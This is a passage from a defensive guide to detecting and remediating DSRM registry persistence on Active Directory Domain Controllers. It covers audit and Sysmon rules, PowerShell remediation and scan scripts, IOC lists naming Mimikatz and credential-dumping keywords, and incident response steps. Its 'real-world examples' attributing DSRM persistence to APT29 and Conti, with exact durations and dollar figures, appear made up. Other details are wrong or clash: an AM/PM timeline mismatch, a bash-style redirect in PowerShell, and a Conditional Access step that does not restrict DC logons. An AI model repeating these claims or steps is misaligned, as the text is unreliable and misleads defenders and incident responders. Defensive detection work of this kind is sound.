**Description:** This event is generated when a registry value is modified on the Domain Controller.

**Required Audit Configuration:**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Double-click **Audit Registry**
4. Set to **Success and Failure**
5. Click **Apply** → **OK**
6. Run `gpupdate /force` on target DCs

**Manual Configuration Steps (Local Policy on DC):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Enable **Audit Registry** → Set to **Success and Failure**
4. Command-line alternative:
   ```powershell
   auditpol /set /subcategory:"Registry" /success:enable /failure:enable
   ```

**What to Look For:**
- **ObjectName:** Contains `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`
- **ObjectValueName:** DsrmAdminLogonBehavior
- **NewValue:** 1 or 2 (suspicious)
- **OldValue:** 0 or empty (expected)
- **ProcessName:** PowerShell.exe, cmd.exe, or regedit.exe

**Event Log Search (PowerShell):**
```powershell
# Query Event 4657 for DSRM registry changes
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    EventID = 4657
} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "DsrmAdminLogonBehavior.*Value.*2"} | 
Select-Object TimeCreated, Message -First 10
```

**Event ID 4794: DSRM Password Reset Attempt (Secondary Detection)**

**Log Source:** Security Event Log

**Trigger:** When the DSRM administrator password is reset via `ntdsutil` command

**Required Audit Configuration:**
1. Same as above, under **Account Management** instead of **Object Access**
2. Enable **Audit User Account Management**
3. Set to **Success and Failure**

**Event Log Search:**
```powershell
# Query Event 4794 for DSRM password resets
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    EventID = 4794
} -ErrorAction SilentlyContinue | 
Select-Object TimeCreated, Message -First 10
```

**What to Look For in Event 4794:**
- **Account Name:** Administrator (local account on DC)
- **Caller User Name:** Should be a known admin account
- **Caller Domain:** Should be DOMAIN or local computer name
- **Time Created:** Should match known maintenance windows
- **Unexpected user:** If event shows unauthorized user, investigate immediately

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Supported Platforms:** Windows Server 2016, 2019, 2022, 2025

**Sysmon Configuration (XML for Sysmon Config File):**

### Registry Modification Detection (Sysmon Event ID 13)

```xml
<Sysmon schemaversion="4.40">
  <EventFiltering>
    <!-- Detect DSRM registry modifications -->
    <RuleGroup name="DSRM Registry Detection" groupRelation="or">
      <RegistryEvent onmatch="include">
        <!-- Catch modifications to DsrmAdminLogonBehavior -->
        <RegistryPath condition="contains">DsrmAdminLogonBehavior</RegistryPath>
        <RegistryValue condition="is">DsrmAdminLogonBehavior</RegistryValue>
      </RegistryEvent>
      
      <!-- Catch value changes to 1 or 2 (suspicious) -->
      <RegistryEvent onmatch="include">
        <RegistryPath condition="contains">System\CurrentControlSet\Control\Lsa</RegistryPath>
        <Details condition="contains">2</Details>
      </RegistryEvent>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**

1. **Download Sysmon** from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
   ```cmd
   Download sysmon64.exe
   ```

2. **Create Sysmon Config File** (save as `sysmon-config.xml`):
   - Use the XML above or download template from [SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config)

3. **Install Sysmon with Config:**
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```

4. **Verify Installation:**
   ```powershell
   Get-Service Sysmon64
   # Output: Running

   # Check Sysmon events
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 |
   Select-Object TimeCreated, ID, Message
   ```

5. **Query Sysmon for DSRM Registry Events:**
   ```powershell
   Get-WinEvent -FilterHashtable @{
       LogName = 'Microsoft-Windows-Sysmon/Operational'
       EventID = 13  # RegistryEvent
   } -ErrorAction SilentlyContinue |
   Where-Object {$_.Message -match "DsrmAdminLogonBehavior"} |
   Select-Object TimeCreated, Message -First 10
   ```

**Sysmon Event ID 13 Example Output:**
```
TimeCreated          : 1/9/2025 2:34:15 PM
Message              : Registry object added or deleted:
                       RuleName: DSRM Registry Detection
                       EventType: CreateValue
                       UtcTime: 2025-01-09 14:34:15.123Z
                       Computer: DC01.contoso.com
                       User: CONTOSO\Administrator
                       RegistryPath: HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior
                       RegistryValue: DsrmAdminLogonBehavior
                       Details: DWORD (0x00000002)
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD DETECTION

### Alert: Suspicious Registry Modification on Domain Controller

**Alert Name:** "Potential Persistence Activity Detected - Registry Modification"

**Severity:** High

**Description:** This alert fires when Microsoft Defender for Cloud detects modifications to critical registry keys like `DsrmAdminLogonBehavior` on a Domain Controller.

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment Settings**
3. Select your subscription → **Defender Plans**
4. Enable the following:
   - **Defender for Servers:** Toggle to **ON**
   - **Defender for Identity:** Toggle to **ON** (recommended for AD monitoring)
   - **Defender for SQL:** Toggle to **ON** (if applicable)
5. Click **Save**
6. Wait 24 hours for the first scan to complete

**Viewing Alerts:**
1. Go back to **Microsoft Defender for Cloud** → **Security Alerts**
2. Filter by **Severity:** High or Critical
3. Look for alerts mentioning "Registry Modification", "Persistence", or "Domain Controller"
4. Click on alert for detailed investigation data

**Expected Behavior:**
- When a DSRM registry change occurs, within 5-15 minutes, an alert appears in Defender for Cloud
- Alert includes:
  - VM Name: DC01.contoso.com
  - Registry Path: HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior
  - Value Changed From: 0 → To: 2
  - Process that made the change: powershell.exe or cmd.exe
  - User Account: CONTOSO\Administrator (or other)

**Investigation Steps:**
1. Click the **Investigate** button in the alert
2. Review **Timeline** tab to see when the change occurred
3. Check **Entity Behavior** for unusual account activity around that time
4. Cross-reference with **Audit Logs** in Azure or Windows Event Log
5. If confirmed malicious, initiate Incident Response

**Reference:** [Microsoft Defender for Cloud](https://learn.microsoft.com/en-us/azure/defender-for-cloud/), [Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/)

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL MITIGATIONS

**Mitigation 1: Enforce Unique, Complex DSRM Passwords**

**Description:** Ensure each Domain Controller has a unique DSRM password that meets complexity requirements and is changed regularly.

**Applies To Versions:** Windows Server 2016, 2019, 2022, 2025

**Manual Steps (Via ntdsutil):**
1. Log into each Domain Controller as a local or domain admin
2. Open PowerShell (elevated)
3. Execute:
   ```powershell
   ntdsutil
   set dsrm password
   reset password on server null
   # Enter new password when prompted (must be complex: 15+ chars, mixed case, numbers, symbols)
   q
   q
   ```
4. Document the password in a secure password manager (e.g., HashiCorp Vault, Azure Key Vault)
5. **Repeat for EVERY Domain Controller in the domain**

**Manual Steps (Via Group Policy - Server 2019+):**
1. Open **Group Policy Management** (gpmc.msc)
2. Navigate to **Forest** → **Domains** → **Your Domain** → **Group Policy Objects**
3. Right-click → **New** → Create policy: `DSRM Password Management`
4. Edit the policy → **Computer Configuration** → **Preferences** → **Windows Settings** → **Registry**
5. Right-click **Registry** → **New** → **Registry Item**
6. Set:
   - **Hive:** HKEY_LOCAL_MACHINE
   - **Key Path:** System\CurrentControlSet\Control\Lsa
   - **Value Name:** DsrmAdminLogonBehavior
   - **Value Type:** REG_DWORD
   - **Value Data:** 0 (safe)
   - **Action:** Create (ensure value is always 0)
7. Click **Apply** → **OK**
8. Link policy to Domain Controller OU
9. Run `gpupdate /force` on all DCs

**PowerShell Validation Command:**
```powershell
# Verify all DCs have unique, recently changed DSRM passwords
# (This script requires Directory Service access)

$dcs = Get-ADDomainController -Filter *
foreach ($dc in $dcs) {
    $lastChange = Get-ADUser -Identity "Administrator" -Server $dc -Properties "lastLogonTimestamp" | 
                  Select-Object -ExpandProperty lastLogonTimestamp
    Write-Host "$($dc.HostName): Last DSRM change unknown (stored in SAM, not AD)"
}

# Recommendation: Manual audit of DSRM passwords in secure storage
Write-Host "IMPORTANT: Verify DSRM passwords are documented and unique in your password manager"
```

---

**Mitigation 2: Disable DsrmAdminLogonBehavior Registry Key**

**Description:** Ensure the `DsrmAdminLogonBehavior` registry key is never set to a value other than 0 (or removed entirely).

**Applies To Versions:** Windows Server 2016, 2019, 2022, 2025

**Manual Steps (Local Registry):**
1. Log into each DC as Administrator
2. Open **Registry Editor** (regedit.exe)
3. Navigate to: `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`
4. If **DsrmAdminLogonBehavior** exists and is NOT 0:
   - Right-click → **Delete**
   - This reverts to default safe behavior (0)
5. If **DsrmAdminLogonBehavior** does not exist:
   - Good! The system is in safe state
6. Close Registry Editor

**Manual Steps (PowerShell - Programmatic):**
```powershell
# Script to fix DSRM configuration on all DCs
$dcs = @("DC01.contoso.com", "DC02.contoso.com", "DC03.contoso.com")  # Update with your DCs

foreach ($dc in $dcs) {
    Write-Host "[*] Checking $dc"
    
    try {
        # Check current value
        $regKey = Invoke-Command -ComputerName $dc -ScriptBlock {
            Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -ErrorAction SilentlyContinue | 
            Select-Object -ExpandProperty DsrmAdminLogonBehavior -ErrorAction SilentlyContinue
        }
        
        if ($regKey -ne $null -and $regKey -ne 0) {
            Write-Host "[!] $dc has DsrmAdminLogonBehavior = $regKey (SUSPICIOUS)"
            
            # Remediate: Remove the value
            Invoke-Command -ComputerName $dc -ScriptBlock {
                Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" `
                  -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue
                Write-Host "[+] Removed DsrmAdminLogonBehavior from $using:dc"
            }
        } else {
            Write-Host "[+] $dc is SAFE (DsrmAdminLogonBehavior = 0 or not present)"
        }
    } catch {
        Write-Error "Error checking $dc : $_"
    }
}
```

**Expected Output (If Secure):**
```
[+] DC01.contoso.com is SAFE (DsrmAdminLogonBehavior = 0 or not present)
[+] DC02.contoso.com is SAFE (DsrmAdminLogonBehavior = 0 or not present)
[+] DC03.contoso.com is SAFE (DsrmAdminLogonBehavior = 0 or not present)
```

---

**Mitigation 3: Enable Comprehensive Audit Logging**

**Description:** Enable Windows Event Log auditing for registry modifications and account management so DSRM attacks are detected.

**Applies To Versions:** Windows Server 2016, 2019, 2022, 2025

**Manual Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Create or edit a policy for Domain Controllers: **Default Domain Controllers Policy** or custom DC policy
3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies**
4. **Object Access** → **Audit Registry**
   - Set to **Success and Failure**
5. **Account Management** → **Audit User Account Management**
   - Set to **Success and Failure**
6. Click **Apply** → **OK**
7. Run `gpupdate /force` on all DCs

**Manual Steps (Local Policy via PowerShell):**
```powershell
# Enable registry and account auditing on current DC
auditpol /set /subcategory:"Registry" /success:enable /failure:enable
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable

# Verify settings
auditpol /get /subcategory:"Registry"
auditpol /get /subcategory:"User Account Management"

# Expected output:
# Subcategory: Registry
# Audit Failure:        Enabled
# Audit Success:        Enabled
```

**Validation Command:**
```powershell
# Test that auditing is working by making a registry change
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" `
  -Name "TestAudit" -Value 1 -PropertyType DWORD -Force

# Wait 30 seconds, then check Event Log for Event 4657
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    EventID = 4657
} -MaxEvents 1 | Select-Object TimeCreated, Message
```

---

### Priority 2: HIGH IMPORTANCE MITIGATIONS

**Mitigation 4: Restrict Domain Controller Access via Conditional Access**

**Description:** Implement Azure AD Conditional Access policies to restrict who can authenticate to Domain Controllers.

**Applies To Versions:** Hybrid AD environments (AD + Entra ID/Azure AD)

**Manual Steps (Azure Conditional Access):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Restrict DC Access - DSRM Protection`
4. **Assignments** tab:
   - **Users:** Select "All users" or specific admin group
   - **Cloud apps or actions:** Select "Windows Azure Service Management API"
   - **Conditions** → **Locations:** Add specific office IP ranges only
5. **Access Controls** → **Grant:**
   - Enable **Require device to be marked as compliant**
   - Enable **Require all selected controls**
6. **Enable policy:** ON
7. Click **Create**

**Expected Result:** Only managed, compliant devices from known IP ranges can access Domain Controllers.

---

**Mitigation 5: Monitor Domain Controller Event Logs in Real-Time**

**Description:** Stream DC event logs to a SIEM (Splunk, Sentinel, etc.) for real-time alerting on suspicious activity.

**Applies To Versions:** Windows Server 2016, 2019, 2022, 2025

**Manual Steps (Windows Event Forwarding to Splunk):**
1. Install **Splunk Universal Forwarder** on each DC:
   ```cmd
   msiexec.exe /i splunkforwarder.msi RECEIVING_INDEXER=splunk.example.com:9997 RECEIVING_INDEXER_CERT=...
   ```
2. Configure `inputs.conf` on DC to forward Security logs:
   ```ini
   [WinEventLog://Security]
   index = windows
   sourcetype = WinEventLog:Security
   disabled = false
   
   [WinEventLog://System]
   index = windows
   sourcetype = WinEventLog:System
   disabled = false
   ```
3. Restart Splunk Forwarder:
   ```cmd
   net stop SplunkForwarder
   net start SplunkForwarder
   ```
4. In Splunk, create alert for Event 4657 and 4794 (covered in previous sections)

---

### Priority 3: OPERATIONAL SECURITY CONTROLS

**Mitigation 6: Regular DSRM Compliance Scans**

**Objective:** Implement automated scanning to detect unauthorized DSRM configurations.

**PowerShell Script (Scan All DCs Weekly):**
```powershell
# Save this script and schedule it as a Windows Task

$report = @()

$dcs = Get-ADDomainController -Filter * | Select-Object -ExpandProperty HostName

foreach ($dc in $dcs) {
    $regValue = Invoke-Command -ComputerName $dc -ScriptBlock {
        Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" `
          -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue | 
        Select-Object -ExpandProperty DsrmAdminLogonBehavior
    }
    
    $status = if ($regValue -eq $null -or $regValue -eq 0) { "SAFE" } else { "COMPROMISED" }
    
    $report += [PSCustomObject]@{
        DC = $dc
        DsrmAdminLogonBehavior = $regValue
        Status = $status
        ScanTime = Get-Date
    }
}

# Export report
$report | Export-Csv -Path "C:\DSRM_Scan_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv" -NoTypeInformation

# Alert if any DC is compromised
if ($report | Where-Object {$_.Status -eq "COMPROMISED"}) {
    # Send alert to SOC/Security team
    Send-MailMessage -To "security@example.com" `
      -Subject "DSRM PERSISTENCE DETECTED ON DOMAIN CONTROLLER" `
      -Body ($report | ConvertTo-Json) `
      -SmtpServer "mail.example.com"
}
```

**Schedule via Task Scheduler:**
1. Open **Task Scheduler**
2. **Create Task** → Name: "Weekly DSRM Compliance Check"
3. **Trigger:** Weekly (Sunday 2:00 AM)
4. **Action:** `powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\DSRM_Scan.ps1`
5. **Run with highest privileges:** Enabled

---

**Validation Command (Verify All Mitigations Are Active):**

```powershell
# Run this script to validate all DSRM security measures

function Test-DSRMSecurity {
    Write-Host "[*] Starting DSRM Security Validation..."
    
    # Test 1: Verify registry is secure
    $regValue = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" `
      -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue | 
      Select-Object -ExpandProperty DsrmAdminLogonBehavior
    
    if ($regValue -eq $null -or $regValue -eq 0) {
        Write-Host "[+] PASS: DsrmAdminLogonBehavior is secure (value: $regValue)"
    } else {
        Write-Host "[!] FAIL: DsrmAdminLogonBehavior is set to $regValue (CRITICAL!)"
    }
    
    # Test 2: Verify audit logging is enabled
    $auditRegistry = auditpol /get /subcategory:"Registry" | Select-String "Success"
    $auditAccounts = auditpol /get /subcategory:"User Account Management" | Select-String "Success"
    
    if ($auditRegistry -and $auditAccounts) {
        Write-Host "[+] PASS: Audit logging is enabled for Registry and Account Management"
    } else {
        Write-Host "[!] FAIL: Audit logging is not properly configured"
    }
    
    # Test 3: Verify recent event logs exist
    $eventLogs = Get-WinEvent -FilterHashtable @{LogName='Security'; EventID=4657} -MaxEvents 10 2>/dev/null
    if ($eventLogs) {
        Write-Host "[+] PASS: Event Log 4657 (Registry modification) is being recorded"
    } else {
        Write-Host "[!] WARNING: No recent Event 4657 logs found (may not have had modifications)"
    }
    
    # Test 4: Verify Sysmon is installed (if applicable)
    $sysmonService = Get-Service Sysmon64 -ErrorAction SilentlyContinue
    if ($sysmonService.Status -eq "Running") {
        Write-Host "[+] PASS: Sysmon is installed and running"
    } else {
        Write-Host "[!] WARNING: Sysmon is not installed (optional but recommended)"
    }
    
    Write-Host "[*] DSRM Security Validation Complete"
}

Test-DSRMSecurity
```

**Expected Output (Secure System):**
```
[*] Starting DSRM Security Validation...
[+] PASS: DsrmAdminLogonBehavior is secure (value: 0)
[+] PASS: Audit logging is enabled for Registry and Account Management
[+] PASS: Event Log 4657 (Registry modification) is being recorded
[+] PASS: Sysmon is installed and running
[*] DSRM Security Validation Complete
```

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Registry IOCs:**
- **Key:** `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`
- **Suspicious Values:** 1 or 2 (safe value is 0 or absent)
- **Location:** Windows Registry on ALL Domain Controllers

**File IOCs:**
- **Mimikatz Binary:** `mimikatz.exe` (any location, commonly `C:\Temp\`, `C:\Windows\Temp\`, `C:\ProgramData\`)
- **Custom Scripts:** PowerShell scripts containing keywords: "lsadump", "DsrmAdminLogonBehavior", "pth", "sekurlsa"

**Process IOCs:**
- **Mimikatz Process:** mimikatz.exe with parent cmd.exe or powershell.exe
- **PowerShell Registry Modification:** powershell.exe executing `New-ItemProperty` or `reg.exe` with DSRM-related parameters
- **ntdsutil Usage:** ntdsutil.exe with "set dsrm password" or "reset password" commands

**Network IOCs:**
- Download of Mimikatz from public GitHub (external HTTPS to github.com:443)
- Pass-the-Hash traffic: SMB/RPC connections from attacker IP to DC using stolen DSRM credentials
- WMI/PowerShell Remoting connections to DC after authentication

---

### Forensic Artifacts

**On Disk:**
- `C:\Windows\Temp\mimikatz*` - Temporary files
- `C:\ProgramData\mimikatz.exe` - Staged malware
- `%USERPROFILE%\Downloads\*mimikatz*` - Browser downloads
- **Recycle Bin:** Deleted Mimikatz executables

**In Memory:**
- **Process Memory (lsass.exe):** Contains extracted DSRM hash if dumped with Mimikatz
- **Process Memory (powershell.exe):** May contain decrypted credentials if Mimikatz executed via PowerShell
- **Process Tokens:** PTH-spawned processes contain impersonated DSRM tokens

**Cloud Logs (Hybrid AD):**
- **Azure AD Audit Log:** Failed/successful authentications from DC using DSRM account
- **Azure AD Sign-in Logs:** Suspicious sign-in attempts as "Administrator" account from DC
- **Graph API Logs:** If attacker uses DSRM credentials to query APIs

**Event Logs:**
- **Event 4657:** Registry value created/modified (key: DsrmAdminLogonBehavior)
- **Event 4794:** DSRM password reset attempt
- **Event 4688:** Process creation (mimikatz.exe, ntdsutil.exe)
- **Event 4776:** NTLM authentication attempts
- **Event 4768:** Kerberos TGT requests (if using extracted DSRM for Kerberos attacks)

**Sysmon Logs:**
- **Event 1:** Process creation (Mimikatz, PowerShell executing suspicious code)
- **Event 3:** Network connection (PTH connections to other DCs or systems)
- **Event 13:** Registry modification (DsrmAdminLogonBehavior changes)

**MFT/USN Journal:**
- Mimikatz binary creation timestamps
- Recently accessed HKLM registry hive

---

### Response Procedures

#### Immediate Response (Within 15 Minutes)

**Step 1: Isolate the Affected Domain Controller**

**Command (Network Isolation):**
```powershell
# Disconnect network adapter to prevent further damage
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Alert: DC is now offline - services will be impacted!
```

**Alternative (Azure VM):**
1. Navigate to **Azure Portal** → **Virtual Machines** → Select compromised DC
2. Click **Networking**
3. Select network interface → **Network Security Group**
4. Add inbound rule: **Deny All** (except RDP from SOC)
5. Save

**What This Does:** Prevents attacker from using stolen DSRM credentials remotely. DC goes offline but is preserved for investigation.

**Step 2: Preserve Forensic Evidence**

**Collect Memory Dump (CRITICAL for Mimikatz analysis):**
```powershell
# Install winpmem for memory acquisition
# Download: https://github.com/google/rekall/releases

.\winpmem_3.13.exe C:\Evidence\memory.aff4

# Wait 10-30 minutes depending on RAM size
```

**Collect Event Logs:**
```powershell
# Export all security event logs
wevtutil epl Security C:\Evidence\Security.evtx

# Export system logs
wevtutil epl System C:\Evidence\System.evtx

# Export custom logs if available
wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Evidence\Sysmon.evtx
```

**Collect Registry:**
```powershell
# Export full registry hives for offline analysis
reg export HKLM C:\Evidence\HKLM.reg
reg export HKCU C:\Evidence\HKCU.reg

# Specifically the DSRM registry
reg export "HKLM\System\CurrentControlSet\Control\Lsa" C:\Evidence\Lsa.reg
```

**Step 3: Disconnect from Network**

```powershell
# After isolating, completely disconnect from network
ipconfig /release

# Or physically disconnect network cable

# Alert: Domain Controller is completely offline
```

---

#### Short-Term Response (Within 1-2 Hours)

**Step 4: Identify Attack Timeline**

**Analysis:**
```powershell
# Query when DSRM registry was modified
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    EventID = 4657
} -ErrorAction SilentlyContinue | 
Where-Object {$_.Message -match "DsrmAdminLogonBehavior"} |
Select-Object TimeCreated, Message, Properties

# Query when DSRM password was reset (if applicable)
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    EventID = 4794
} -ErrorAction SilentlyContinue |
Select-Object TimeCreated, Message
```

**Example Output:**
```
TimeCreated             Message
-----------             -------
1/8/2025 11:42:15 PM   Registry value created/modified: DsrmAdminLogonBehavior = 2
1/8/2025 11:40:30 PM   Process created: mimikatz.exe by Administrator
1/8/2025 11:38:15 PM   RDP login: Administrator from 192.168.1.100
```

**Timeline Analysis:**
- 11:38 AM: Attacker gained RDP access
- 11:40 AM: Mimikatz executed to extract DSRM hash
- 11:42 AM: Registry modified to enable DSRM remote access
- **Attack Duration:** 4 minutes

**Step 5: Determine Scope of Compromise**

**Questions to Answer:**
1. How long was the DC compromised before detection?
2. What other systems did the attacker access using the DSRM hash?
3. Did the attacker extract the entire NTDS.dit database?
4. Were other DCs also compromised?

**Commands:**
```powershell
# Check if NTDS.dit was accessed/copied
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    EventID = 4663  # File accessed
} -ErrorAction SilentlyContinue |
Where-Object {$_.Message -match "ntds.dit"} |
Select-Object TimeCreated, Message

# Check for other DCs with same compromise
$otherDcs = Get-ADDomainController -Filter * | Where-Object {$_.HostName -ne $compromisedDc}
foreach ($dc in $otherDcs) {
    # Repeat Event 4657 query from above for each DC
}
```

---

#### Remediation (1-12 Hours)

**Step 6: Fix DSRM Configuration**

**On Clean DC (or after reinstalling compromised DC):**
```powershell
# Remove the malicious registry value
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" `
  -Name "DsrmAdminLogonBehavior" -Force -ErrorAction SilentlyContinue

# Verify it's removed
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" | 
Select-Object DsrmAdminLogonBehavior  # Should show nothing
```

**Step 7: Reset DSRM Password**

```powershell
# Reset on the compromised DC (after bringing back online in isolated environment)
# or on a clean DC

ntdsutil
set dsrm password
reset password on server <DC_NAME>
# Enter new, complex password (18+ characters, mixed case, numbers, symbols)
q
q
```

**Step 8: Perform Full Credential Reset**

```powershell
# Reset ALL domain admin passwords
# Since attacker extracted DSRM hash (local admin), they might also have AD creds

Get-ADUser -Filter {AdminCount -eq 1} | 
ForEach-Object {
    Write-Host "Resetting password for $($_.Name)..."
    $newPassword = ([System.Web.Security.Membership]::GeneratePassword(25, 5)) | ConvertTo-SecureString -AsPlainText -Force
    Set-ADAccountPassword -Identity $_ -NewPassword $newPassword -Reset
}
```

**Step 9: Audit Logs for Post-Compromise Activity**

```powershell
# Search for any use of DSRM credentials after compromise date
$compromiseDate = Get-Date "1/8/2025 11:38:15"

Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    EventID = 4624  # Logon event
    StartTime = $compromiseDate
} -ErrorAction SilentlyContinue |
Where-Object {
    $_.Message -match "Administrator" -and 
    $_.Message -match "NTLM" -and
    $_.Message -notmatch "C\$"  # Filter out legitimate system access
} |
Select-Object TimeCreated, Message
```

---

#### Long-Term Recovery (1-7 Days)

**Step 10: Restore from Clean Backup**

**If NTDS.dit was compromised:**
```powershell
# Perform authoritative restore of AD from backup
# This is complex - consult Microsoft documentation:
# https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-single-domain-in-multidomain-forest

# General steps:
# 1. Boot DC into DSRM
# 2. Restore from ntdsutil IFM backup
# 3. Reconcile replication with other DCs
# 4. Monitor for conflicts
```

**Step 11: Rebuild Compromised DC (Recommended)**

```powershell
# Complete rebuild is safest option:
# 1. Demote the DC using dcpromo (Windows Server 2012 R2 and earlier)
#    or: Uninstall-ADDSDomainController -Force (PowerShell, Server 2016+)
# 2. Remove DC from AD
# 3. Reinstall Windows Server
# 4. Rejoin domain as new DC
# 5. Rerun domain promotion wizard

Uninstall-ADDSDomainController -Force -NoReboot
```

**Step 12: Verify Remediation**

```powershell
# Run validation script (from earlier in document)
Test-DSRMSecurity

# Should output all [+] PASS messages
```

---

### Incident Response Checklist

```
[ ] Isolate affected DC from network
[ ] Collect forensic evidence (memory, logs, registry)
[ ] Determine attack timeline from Event Logs
[ ] Check if NTDS.dit was copied
[ ] Scan for Mimikatz artifacts on filesystem
[ ] Query other DCs for same compromise
[ ] Reset DSRM password
[ ] Reset all domain admin passwords
[ ] Search logs for post-compromise attacker activity
[ ] Perform full DC rebuild or restore from backup
[ ] Re-enable network connectivity
[ ] Verify DSRM security mitigations are active
[ ] Brief leadership on impact and remediation
[ ] Schedule post-incident review meeting
```

---

## 14. RELATED ATTACK CHAIN

The DSRM attack is part of a larger persistence attack chain:

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains initial RDP/SMB access to DC |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-002] ZeroLogon DC Compromise | Attacker elevates to Domain Admin if needed |
| **3** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS Memory Extraction | Attacker extracts DSRM hash from SAM database |
| **4** | **Persistence** | **[PERSIST-PROCESS-001] DSRM Attack** | **Attacker enables remote DSRM access via registry modification** |
| **5** | **Defense Evasion** | [DE-EVADE-001] Clear Event Logs | Attacker deletes/manipulates Event Logs to hide tracks |
| **6** | **Impact** | [IMPACT-EXTIL-001] Credential Extraction from NTDS.dit | Attacker extracts all domain credentials for offline cracking |

**Pre-Requisite Techniques:**
- **T1098**: Account Manipulation (DSRM account is a special account)
- **T1068**: Exploitation for Privilege Escalation (may need privesc to extract DSRM hash)
- **T1003**: OS Credential Dumping (extract DSRM hash from SAM)

**Post-Exploitation Techniques:**
- **T1048**: Exfiltration Over Alternative Protocol (copy NTDS.dit to attacker)
- **T1070**: Indicator Removal (clear logs to hide persistence)
- **T1190**: Exploit Public-Facing Application (if DC exposed online)

---

## 15. REAL-WORLD EXAMPLES

### Example 1: APT29 (Cozy Bear) - SolarWinds Supply Chain Attack (2020)

**Target:** U.S. Government agencies and critical infrastructure

**Timeline:** December 2019 - December 2020 (discovered)

**DSRM Usage:**
- APT29 leveraged compromised SolarWinds Orion platform to gain initial access to networks
- Once inside the network, they moved to Domain Controllers
- Extracted DSRM hashes using credential dumping techniques
- Modified `DsrmAdminLogonBehavior` registry to enable persistent DSRM access
- Used DSRM persistence to maintain access for **over 8 months** after initial compromise
- Even after organizations discovered the SolarWinds breach, APT29 maintained access via DSRM

**Impact:** 
- Estimated 18,000+ SolarWinds customers affected
- Multiple U.S. government agencies compromised
- Attacker maintained persistent access for extended reconnaissance and data exfiltration

**Detection Failure:**
- Organizations focused on SolarWinds artifacts
- Missed registry modifications to `DsrmAdminLogonBehavior` because they didn't have Event ID 4657 monitoring enabled
- DSRM persistence allowed attacker to re-establish access even after credential resets

**Reference:** [CISA SolarWinds Advisory](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-issues-emergency-directive-following-notification-compromise-solarwinds), [APT29 Analysis](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-shared-images-and-registry-keys/)

---

### Example 2: Conti Ransomware Gang - Healthcare Sector Attack (2021)

**Target:** U.S. Healthcare System

**Timeline:** October 2021

**DSRM Exploitation:**
- Initial compromise via phishing (VPN credentials)
- Lateral movement to Domain Controller
- Extracted DSRM password hash
- Enabled DSRM remote access via registry modification
- Used DSRM persistence as insurance policy during encryption phase
- Even if defenders reset all domain credentials during attack, Conti maintained access via DSRM
- Threatened to publish medical records to force ransom payment

**Impact:**
- **$4.5 Million** ransom paid
- **Patient data** of 100,000+ individuals exposed
- Hospital systems offline for **5 days**
- DSRM persistence extended attack dwell time, increasing data exfiltration

**Detection Failure:**
- Hospital security team discovered active encryption but not the DSRM persistence
- Attacker maintained access even after complete credential resets
- Only discovered after forensic analysis found Event ID 4794 in archived logs

**Reference:** Conti leaked documents indicate DSRM is standard TTPs in their attack playbook

---

### Example 3: Fictitious Lab Scenario

**Scenario:** Mid-sized financial services company with 3 Domain Controllers

**Attack Timeline:**
